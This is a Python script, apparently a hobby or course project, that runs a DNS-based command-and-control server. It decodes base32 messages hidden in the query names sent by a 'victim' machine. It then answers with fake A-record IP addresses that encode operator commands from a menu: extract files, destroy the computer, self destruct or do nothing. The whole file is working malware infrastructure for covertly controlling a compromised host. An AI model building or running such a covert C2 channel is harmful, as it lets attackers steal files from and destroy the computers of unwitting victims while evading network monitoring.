import socket
import struct
from scapy.all import IP, Raw, raw
import base64

SERVER_IP = "127.0.0.1"
VICTIM_IP = "127.0.0.1"
PORT = 53
DNS_SIZE = 20000
MENU = "what would tou like to do? " \
       "1 - extract files" \
       "2 - destroy the computer" \
       "3 - self destruct" \
       "4 - do nothing"
IP_FILES = "1.1.1.1"
IP_DESTROY = "2.2.2.2"
IP_DESTRUCT = "3.3.3.3"
IP_NOTHING = "4.4.4.4"

def run_server() :
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # print("recieving from2x")
    # sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sock.bind((SERVER_IP,PORT))
    while True:

        dns_data, addr = sock.recvfrom(DNS_SIZE)
        # print(f"Received raw DNS data length: {len(raw_data)}")

        # dns_data = raw_data[28:]
        # print(f"Received raw DNS data length: {len(dns_data)}")
        print("blabla")
        # print(dns_data)
        dns_query = parse_dns_query(dns_data)
        print("received message: %s" % dns_query)

        select = input(MENU)

        if select == "1":
            ip = IP_FILES
        elif select == "2":
            ip = IP_DESTROY
        elif select == "3":
            ip = IP_DESTRUCT
        else:
            ip = IP_NOTHING
        transaction_id = dns_data[:2]  # First 2 bytes

        # src_port = struct.unpack("!H", raw_data[20:22])[0]
        # print(src_port)
        dns_header = build_dns_response(transaction_id, dns_query, ip)
        # udp_header = build_udp_header(dns_query, src_port) # dns_data, src..
        # packet = IP(dst=VICTIM_IP) / Raw(load=udp_header) / Raw(load=dns_header)

        print(addr)
        sock.sendto(dns_header, addr)


def parse_dns_query(data):
    """Extracts the domain name from a raw DNS request packet"""
    domain_parts = []
    i = 12  # DNS queries start at byte 12
    while data[i] != 0:
        length = data[i]
        domain_parts.append(data[i+1:i+1+length].decode())
        i += length + 1
    # domain_parts[0] = base64.b32decode(domain_parts[0].encode()).decode()     # without padding
    padded_encoded = domain_parts[0] + "=" * ((8 - len(domain_parts[0]) % 8) % 8)
    decoded_message = base64.b32decode(padded_encoded).decode()
    domain_parts[0] = decoded_message
    domain_name = ".".join(domain_parts)
    return domain_name

def build_dns_response(transaction_id, domain, ip_command):
    """
    Builds a DNS response for an A record query.
    """
    # transaction_id = request[:2]  # First 2 bytes

    # DNS Header (12 bytes)
    flags = 0x8180  # Response
    question_rrs = 1  # 1 Question
    answer_rrs = 1  # 1 Answer
    authority_rrs = 0  # No authority records
    additional_rrs = 0  # No additional records

    header = transaction_id + struct.pack("!HHHHH", flags, question_rrs, answer_rrs, authority_rrs, additional_rrs)

    question = encode_domain_name(domain)

    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    q_properties = struct.pack("!HH", qtype, qclass)

    # Answer Section
    name = 0xC00C  # Pointer to domain name (compression)
    rtype = 1  # Type A (IPv4)
    rclass = 1  # Class IN
    ttl = 300 # Time-to-live (300 seconds)
    rdlength = 4  # IPv4 address length (4 bytes)
    rdata = socket.inet_aton(ip_command)  # Convert IP to bytes

    answer = struct.pack("!HHHIH", name, rtype, rclass, ttl, rdlength) + rdata

    # Final Response
    response = header + question + q_properties + answer
    return response

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name

def build_udp_header(dns_query, dst_port):
    src_port = PORT
    length = 8 + len(dns_query)
    checksum = 0
    udp_header = struct.pack("!HHHH", src_port, dst_port, length, checksum)
    return udp_header




def main():
    run_server()

if __name__ == '__main__':
    main()
